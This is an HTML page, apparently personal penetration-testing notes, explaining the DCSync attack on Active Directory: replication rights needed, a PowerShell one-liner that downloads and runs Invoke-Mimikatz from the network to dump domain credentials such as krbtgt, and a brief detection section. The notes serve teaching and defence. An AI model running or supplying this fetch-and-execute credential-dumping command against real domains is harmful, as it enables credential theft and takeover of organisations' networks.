@@ -1,0 +1,48 @@
+<!doctype html>
+<html>
+
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>DCSync: Impersonate a Domain Controller</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+</head>
+
+<body>
+  <div class='page'>
+    <h1 class='title'>DCSync: Impersonate a Domain Controller</h1><br />For “<a
+      href="https://adsecurity.org/?p=1729" target="_blank">DCSync</a>” attack Microsoft did not issue any patch, as it only uses
+    legitimate APIs. “Fixing” it would mean forbidding DC replication. If it ain’t broke, don’t fix it. AD is not
+    broken.<br /><br /><strong>What is Directory Replication Service (DRS)?</strong><br />For availability reasons,
+    administrators deploy more Domain Controllers in an Active Directory infrastructure. Each of these Domain
+    Controllers has a copy of the Active Directory database. <br />When changes/updates to a database of a Domain
+    Controller are done (for example when a new user is created), this change needs to be propagated to the other Domain
+    Controllers. <br />This is called Active Directory replication<br /><br /><strong>How DCSync use Directory
+      Replication Service (DRS)?</strong><br />DCSync(a method of Mimikatz) using the GetNCChanges request, prompts a
+    Domain Controller to replicate user credentials back to the attacker using the Directory Replication Service (DRS)
+    Remote Protocol.<br /><br /><strong>Perform DCSync from a Windows machine of the Domain</strong><br /><span
+      style="text-decoration:underline;">pre-requisite</span>: To have success with DCSync attack we need an account
+    with rights to perform domain replication. <br />We can perform DCSync if we have “Replicating Directory Changes”
+    permissions on the Windows Server:<br /> <em>Server Manager → Tools → Active Directory Users and Computers → View →
+      Advanced Features → Right click on the domain(e.g.:DANIELE.local) → proprieties → security</em><br /> ▪
+    Replicating Directory Changes <br /> ▪ Replicating Directory Changes All<br /> ▪ Replicating Directory Changes In
+    Filtered Set (rare, only required in some environments)<br />Note that members of the Administrators and Domain
+    Controller groups have these rights by default.<br /> <a href=""><img src="images/1221-1.png"
+        alt="images/1221-1.png" /></a><br /><br /><br /><strong>Attack</strong><br />If we want we can specify a
+    specific user credential for lsadump::dcsync with /user:&lt;user&gt; for example “/user:krbtgt” or
+    “/user:administrator”<br />
+    <div class="codebox">
+      <div class="codebox">
+        PS&gt;&nbsp;IEX(New-Object&nbsp;Net.WebClient).DownloadString(&quot;https://raw.githubusercontent.com/BC-SECURITY/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1&nbsp;&quot;);Invoke-Mimikatz&nbsp;-Command&nbsp;&#39;&quot;lsadump::dcsync&nbsp;/domain:daniele.local&nbsp;&quot;&#39;
+      </div>
+    </div><br /> <a href=""><img src="images/1221-2.png"
+        alt="images/1221-2.png" /></a><br /><br /><strong>Detection:</strong><br />DRSR network traffic should only
+    occur between domain controllers. If a company detects DRSR network traffic between a domain controller and a
+    workstation, it knows a dcsync attack took place<br />We can apply that by adding IP addresses of Domain Controllers
+    to the Replication Allow List. when DSGetNCChange requests originate outside that list of IPs an alert of Intrusion
+    Detection Systems(IDS) should occur.<br /> <br />Bibliography:<br />• <a
+      href="https://adsecurity.org/?p=1729"  target="_blank">https://adsecurity.org/?p=1729</a>
+  </div>
+</body>
+
+</html>
